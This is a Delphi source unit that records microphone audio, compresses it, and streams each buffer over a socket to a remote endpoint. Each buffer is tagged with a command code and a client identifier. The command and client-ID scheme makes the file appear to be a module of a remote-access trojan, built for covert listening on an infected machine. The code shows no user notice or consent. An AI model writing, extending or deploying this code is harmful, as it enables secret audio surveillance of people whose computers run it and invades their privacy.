unit UnitMicrophone;

interface

uses
  Windows, ACMConvertor, ACMIn, UnitCommands, MMSystem, SocketUnitEx, UnitFunctions,
  UnitVariables, StreamUnit;

procedure StartMicrophone(Channel, Sample: Integer; ClientSocket: TClientSocket);
procedure StopMicrophone;

implementation

type
  TMain = class
    ClientSocket: TClientSocket;
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  end;

threadvar
  ACMC: TACMConvertor;
  ACMI: TACMIn;
  Main: TMain;

procedure StartMicrophone(Channel, Sample: Integer; ClientSocket: TClientSocket);
var
  Format: TWaveFormatEx;
begin
  Format.nChannels := Channel;
  Format.nSamplesPerSec := Sample;
  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;

  ACMC := TACMConvertor.Create;
  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
  ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;

  Main := TMain.Create;
  Main.ClientSocket := ClientSocket;

  ACMI := TACMIn.Create;
  ACMI.OnBufferFull := Main.BufferFull;
  ACMI.BufferSize := ACMC.InputBufferSize;
  
  ACMC.Active := True;
  ACMI.Open(ACMC.FormatIn);

  while MicStream = True do ProcessMessages;
end;

procedure StopMicrophone;
begin
  try
    ACMC.Active := False;
    ACMI.Close;
    ACMI.Free;
    ACMC.Free;
    Main.Free;
    Main := nil;
  except
  end;
end;

procedure TMain.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  Stream: TMemoryStream;
  ToSend: string;
  TmpSize: Integer;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  TmpSize := ACMC.Convert;
  Stream := TMemoryStream.Create;
  Stream.Write(ACMC.BufferOut^, TmpSize);
  Stream.Position := 0;
  SetLength(ToSend, Stream.Size);
  Stream.Read(Pointer(ToSend)^, Length(ToSend));
  Stream.Free;

  ClientSocket.SendDatas(MICROPHONECAPTURESTART + '|' + ClientId + '|' + ToSend);
end;

end.

